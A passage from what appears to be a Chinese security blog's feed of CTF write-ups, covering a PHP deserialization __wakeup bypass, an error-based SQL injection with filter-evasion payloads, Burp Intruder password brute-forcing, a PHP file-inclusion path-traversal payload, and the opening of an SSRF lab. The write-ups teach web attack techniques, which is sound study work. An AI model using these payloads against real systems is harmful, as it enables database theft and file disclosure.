总结</h2><p>1、构造payload的时类中的字段原样构造，不要修改其原数据（自己构造payload的时踩的坑）</p><p>2、<strong>绕过_wakeup()方法：在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 _wakeup()函数的执行</strong></p><p>3、private声明时最后的不可见字符，在构造payload的时需要编码为%00</p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-HardSQL</title>
      <link href="/2022/07/22/BUU-HardSQL/"/>
      <url>/2022/07/22/BUU-HardSQL/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>BUU一到SQL注入题目。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>打开靶场：</p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193115706.png" alt="image-20220722193115706"></p><p>先试试万能密码：<br><img src="/2022/07/22/BUU-HardSQL/image-20220722193158683.png" alt="image-20220722193158683"></p><p>这里应该是把空格过滤了，测试一下：</p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193206702.png" alt="image-20220722193206702"></p><p>输入admin’ ‘，还是返回同样的页面：</p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193344862.png" alt="image-20220722193344862"></p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193416204.png" alt="image-20220722193416204"></p><p>使用括号替换空格发现出现报错，没有出现那几个汉字，证明确实过滤了空格：</p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193501191.png" alt="image-20220722193501191"></p><blockquote><p><strong>空格绕过原理：</strong></p><p>括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格。</p></blockquote><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>这里使用报错注入试试：</p><pre class="line-numbers language-none"><code class="language-none">admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193846743.png" alt="image-20220722193846743"></p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193803204.png" alt="image-20220722193803204"></p><p>爆出数据库。</p><p>查表时候遇到<code>=</code>也被过滤了：</p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722195230839.png" alt="image-20220722195230839"></p><p><img src="/2022/07/22/BUU-HardSQL/image-20220722195240537.png" alt="image-20220722195240537"></p><p>那这里就是用like进行绕过。</p><p>继续查表：</p><pre class="line-numbers language-none"><code class="language-none">admin&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/22/BUU-HardSQL/image-20220722193955687.png" alt="image-20220722193955687"></p><p>查列名：</p><pre class="line-numbers language-none"><code class="language-none">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/22/BUU-HardSQL/image-20220722194218537.png" alt="image-20220722194218537"></p><p>查flag：</p><pre class="line-numbers language-none"><code class="language-none">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1)),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/22/BUU-HardSQL/image-20220722194303359.png" alt="image-20220722194303359"></p><p>只拿到一般flag；另一半使用right构造payload：</p><p><strong>（这里由于是得到一般flag，一般可以使用substring和mid来截取，但是这两个字段也被过滤了，使用right或者left进行替换绕过）</strong></p><pre class="line-numbers language-none"><code class="language-none">admin&#39;or(updatexml(1,concat(0x7e,(select(right(password,25))from(H4rDsq1)),0x7e),1))#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/07/22/BUU-HardSQL/image-20220722194840708.png" alt="image-20220722194840708"></p><p>得到flag{da8a8535-7969-4874-9ab7-63496c6970ad}</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><blockquote><p>1：空格被过滤可以使用&#x2F;**&#x2F;或者()绕过<br>2：&#x3D;号被过滤可以用like来绕过<br>3：substring与mid被过滤可以用right与left来绕过</p></blockquote><blockquote><p><strong>空格绕过原理：</strong></p><p>括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-bp</title>
      <link href="/2022/07/22/Bugku-bp/"/>
      <url>/2022/07/22/Bugku-bp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>Bugku一道弱口令爆破题目，比平时的爆破略微有些不同。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>打开靶场，提示使用弱口令top1000，而且应该是z开头的六位密码：</p><p><img src="/2022/07/22/Bugku-bp/image-20220722102240226.png" alt="image-20220722102240226"></p><p><img src="/2022/07/22/Bugku-bp/image-20220722102227793.png" alt="image-20220722102227793"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>从网上下载好top1000弱口令字典直接使用bp设置好参数进行爆破：<br><img src="/2022/07/22/Bugku-bp/image-20220722102553838.png" alt="image-20220722102553838"></p><p><img src="/2022/07/22/Bugku-bp/image-20220722102607162.png" alt="image-20220722102607162"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><img src="/2022/07/22/Bugku-bp/image-20220722102708768.png" alt="image-20220722102708768"></p><p>观察长度都一样，没有任何一个不同，这就是与平时爆破不同的地方；</p><p>无非两种情况：<br>1、正确的密码不在字典当中；</p><p>2、正确的密码在已使用的密码字典中，但是不论输入的密码是否正确，Response的长度都是908</p><p>不管使用什么字典，都是908；</p><p>查看返回包看看有什么不同：<br><img src="/2022/07/22/Bugku-bp/image-20220722103101425.png" alt="image-20220722103101425"></p><p>每一条回应包都有一段这样的JS代码，提示密码错误，这里可以猜想，正确的回应包应该和现在的回应包有所不同。二者之间的差异应该就在这段JS代码当中。</p><p>JS代码中声明了<code>var r = &#123;code: &#39;bugku10000&#39;&#125;</code>这样一个变量，若是<code>r.code</code>等于<code>bugku10000</code>就返回密码错误，否则就返回正确。</p><p>既然报错返回包中会有<code>&#123;code: &#39;bugku10000&#39;&#125;</code>此字段，那就将此字段放入爆破模块进行匹配，返回不同结果则表示为正确的密码。</p><p>这时需要用到Intruder中的Grep-Match功能：</p><p><img src="/2022/07/22/Bugku-bp/image-20220722103745865.png" alt="image-20220722103745865"></p><p>该功能可以帮我们分析<strong>Response中是否含有给定字符串</strong>。</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>继续爆破，不过此时就不是观察长度来判断，而是观察所加入的字段来判断：<br><img src="/2022/07/22/Bugku-bp/image-20220722104108241.png" alt="image-20220722104108241"></p><p>观察<code>&#123;code: &#39;bugku10000&#39;&#125;</code>字段，看到其他密码都被打了☑，只有最有一个没有，尝试登录：<br><img src="/2022/07/22/Bugku-bp/image-20220722104404323.png" alt="image-20220722104404323"></p><p>得到flag。</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>再观察对应返回包：</p><p>正确返回包返回的是hacker1000</p><p><img src="/2022/07/22/Bugku-bp/image-20220722104453822.png" alt="image-20220722104453822"></p><p>错误返回包返回的还是bugku10000</p><p><img src="/2022/07/22/Bugku-bp/image-20220722104505096.png" alt="image-20220722104505096"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>与平时爆破不同的是这次观察的不是长度，这也说明，可能有时进行爆破密码正确也不一定能够直接观察出来，还需要查看回显数据包进行进一步检测，需要配合回显数据包的数据进行密码爆破。关注点有时可能并不是一个，而是多个。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-WarmUp</title>
      <link href="/2022/07/21/BUU-WarmUp/"/>
      <url>/2022/07/21/BUU-WarmUp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>BUU，Web题目WarmUp，PHP代码审计。</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>打开靶场只有一个表情包：</p><p><img src="/2022/07/21/BUU-WarmUp/image-20220721173005224.png" alt="image-20220721173005224"></p><p>查看源码发现source.php文件，直接访问：</p><p><img src="/2022/07/21/BUU-WarmUp/image-20220721173045769.png" alt="image-20220721173045769"></p><p><img src="/2022/07/21/BUU-WarmUp/image-20220721173126908.png" alt="image-20220721173126908"></p><p>出现源代码。</p><p>看到源码中存在一个hint.php文件，直接访问：<br><img src="/2022/07/21/BUU-WarmUp/image-20220721175041521.png" alt="image-20220721175041521"></p><p>提示flag在ffffllllaaaagggg当中，告诉了flag的文件位置。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>直接代码审计：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先分析非类部分：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">exit</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>get&#x2F;post&#x2F;cookie提交一个名字为file的参数。if语句有3个条件,条件之间用(&amp;&amp;)连接，只有全部满足才能通过。1.file参数非空。2.file参数是一个字符串。3.file参数能通过emmm类中的checkFile函数。只有通过着3个条件。我们才能包含文件。</p><p>类emmm种有白名单检测</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span><span class="token comment">//白名单列表</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">//isset()判断变量是否声明 is_string()判断变量是否是字符串 </span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//如果变量声明且为字符串判别为假</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>             <span class="token comment">//白名单判断，是hint或source返回真</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token comment">/*mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置mb_strpos (haystack ,needle )haystack：要被检查的字符串。needle：要搜索的字符串*/</span>            <span class="token comment">//此时$_page接收的是整个file值</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token comment">//?截断   截取page变量从开头到?</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//此时的$_page是已经是截断之后的hint.php了</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token comment">//再一次白名单检查</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//url解码</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token comment">//之后在hint.php文件后又加上了?使得又截断为hint.php</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//二次截断</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token comment">//第三次白名单检查</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要满足经过两次?截断后仍能通过白名单检查，并且include正确路径，才输出flag。</p><p>这里还需要利用include的一个知识点：</p><p><img src="/2022/07/21/BUU-WarmUp/image-20220721174908512.png" alt="image-20220721174908512"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ffb11562-d308-4052-9108-23f271597c1e.node4.buuoj.cn:81&#x2F;source.php?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用了六层目录出flag：</p><p><img src="/2022/07/21/BUU-WarmUp/image-20220721175713406.png" alt="image-20220721175713406"></p><p><img src="/2022/07/21/BUU-WarmUp/image-20220721175720845.png" alt="image-20220721175720845"></p><p>这里使用几层目录都需要自己一层一层去试；</p><blockquote><p>如果include包含的文件中含有路径，就会包含最后一个<code>/</code>后面的文件，因此直接构造payload:source.php?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p><p>本来是会包含hint.php文件的，但是后面出现了<code>../</code>，就包含了最后面的ffffllllaaaagggg</p><p> 有多少<code>../</code>在哪一层目录完全是可以自己去试出来的。</p></blockquote><blockquote><p><strong>注：</strong></p><p><strong>include函数有这么一个神奇的功能：以字符‘&#x2F;’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘&#x2F;’后面的文件——注意是最后一个‘&#x2F;’。</strong></p></blockquote><p>payload解释：</p><p>checkfile检测传入的file的值，将file赋给page变量，首先白名单检测hint.php在白名单内返回真。</p><p>然后?截断在第一次截断的时候将file中的hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg截断为hint.php并顺利通过第二次白名单检测。变量<code>$_page</code>应该是发生了两次变化：第一次接收的是file整个值，第一次截断之后变量<code>$_page</code>已经变成了hint.php文件。</p><p>接着是一次url解码，将page变量进行一次url解码。</p><p>注意</p><pre class="line-numbers language-none"><code class="language-none">mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这段代码，“$_page . ‘?’,”，中的<code>.</code>是一个连接符，相当于在__page变量后加上一个?。于是这次同样截断剩下hint.php再次顺利通过白名单检测。最后满足3个if条件执行include语句。在包含的时候会把hint.php?&#x2F;当成一层目录，然后构造..&#x2F;..&#x2F;向上遍历找到flag。</p><p>这里payload:source.php?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg也是可以的，只要传入的$_page在白名单当中即可。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF靶场</title>
      <link href="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/"/>
      <url>/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00-CTFHUB"><a href="#0x00-CTFHUB" class="headerlink" title="0x00 CTFHUB"></a>0x00 CTFHUB</h2><p>CTFHUB的SSRF题目。</p><h2 id="0x01-涉及协议及知识点"><a href="#0x01-涉及协议及知识点" class="headerlink" title="0x01 涉及协议及知识点"></a>0x01 涉及协议及知识点</h2><blockquote><p>http:&#x2F;&#x2F;：探测内网主机存活、端口开放情况，可以通过访问其它网站确定存活，如百度</p><p>gopher:&#x2F;&#x2F;：发送GET或POST请求(需要配合http协议二次url编码上传)；攻击内网应用，如FastCGI、Redis</p><p>dict:&#x2F;&#x2F;：泄露安装软件版本信息，查看端口，操作内网redis访问等</p><p>file:&#x2F;&#x2F;：读取本地文件，如&#x2F;etc&#x2F;passwd、&#x2F;etc&#x2F;hosts、web网站等等</p></blockquote><h2 id="0x02-内网访问"><a href="#0x02-内网访问" class="headerlink" title="0x02 内网访问"></a>0x02 内网访问</h2><p><img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721095051455.png" alt="image-20220721095051455"></p><p>题目直接提示访问127.0.0.1的flag.php</p><p>打开靶场以后空白页面，地址栏看到有url参数，根据题目内网访问，可以肯定是能够探测内网是否存在存活主机的：</p><p><img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721095313140.png" alt="image-20220721095313140"></p><p>探测一下http协议能否使用：</p><p><img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721095618298.png" alt="image-20220721095618298"></p><p>访问百度可以跳转页面，证明http协议是能够使用的；</p><p>题目给出直接访问flag.php文件：<br><img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721095813535.png" alt="image-20220721095813535"></p><p>得到flag。</p><h2 id="0x03-伪协议读取文件"><a href="#0x03-伪协议读取文件" class="headerlink" title="0x03 伪协议读取文件"></a>0x03 伪协议读取文件</h2><p>题目给出读取Web目录下的flag.php：</p><p><img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721095916568.png" alt="image-20220721095916568"></p><p>提示给出flag.php地址，那这里肯定就需要使用伪协议来读取文件。</p><p>直接读取：</p><p><img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721100339921.png" alt="image-20220721100339921"></p><p>查看源码：<br><img src="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/image-20220721100354877.png" alt="image-20220721100354877"></p><h2 id="0x04-端口扫描"><a href="#0x04-端口扫描" class="headerlink" 